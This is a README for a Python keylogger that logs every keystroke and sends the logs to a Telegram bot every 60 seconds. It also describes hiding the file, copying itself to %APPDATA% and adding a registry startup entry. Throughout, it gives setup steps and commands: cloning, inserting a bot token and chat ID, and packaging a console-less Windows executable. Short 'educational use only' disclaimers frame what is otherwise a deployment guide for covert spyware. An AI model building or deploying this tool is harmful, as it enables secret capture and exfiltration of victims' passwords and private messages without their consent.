# 🕵️ Telegram Keylogger (Python)

> ⚠️ **Disclaimer:** This project is created for **educational and ethical testing** purposes **only**. Unauthorized access to someone's computer or data without permission is **illegal**. Use it responsibly.

This is a Python-based keylogger that logs keystrokes and sends them to a Telegram bot every 60 seconds. It auto-hides, copies itself to `%APPDATA%`, and adds to Windows startup for persistence.

---

## 🔧 Features

- ✅ Captures all keyboard input
- ✅ Sends logs to Telegram using Bot API
- ✅ Hides itself in the system
- ✅ Adds to Windows startup
- ✅ Lightweight and simple

---

## 📦 Requirements

- Python 3.x
- Install required packages:
  ```bash
  pip install pynput requests
🚀 How to Use
🔹 Step 1: Clone or Download
  ```bash
git clone https://github.com/localhostvicky/window_keylogger.git
cd window_keylogger
  ```
🔹 Step 2: Edit Script
Open the script and replace these values:
  ```bash
bot_token = 'YOUR_BOT_TOKEN'
chat_id = 'YOUR_CHAT_ID'
  ```
To get your chat_id, send a message to your bot and open:
  ```bash
https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
  ```

🔹 Step 3: Run the Script
Run it directly:

  ```bash
python window_keylogger.py
  ```

Or create a Windows EXE file:
  ```bash
pip install pyinstaller
pyinstaller --noconsole --onefile window_keylogger.py
  ```
The .exe file will be inside the dist/ folder.

⚙️ How It Works (Summary)

Logs keystrokes using pynput
Sends logs to Telegram every 60 seconds using requests
Copies itself to %APPDATA%
Hides itself using SetFileAttributes
Adds to Windows startup using the registry

📁 File Structure
  ```bash
window_keylogger/
├──window_keylogger.py     # Main script
├── README.md        # Project documentation
  ```
⚠️ Legal Note
This tool is meant only for educational purposes and authorized penetration testing. Do not use it on devices you do not own. The developer takes no responsibility for misuse.

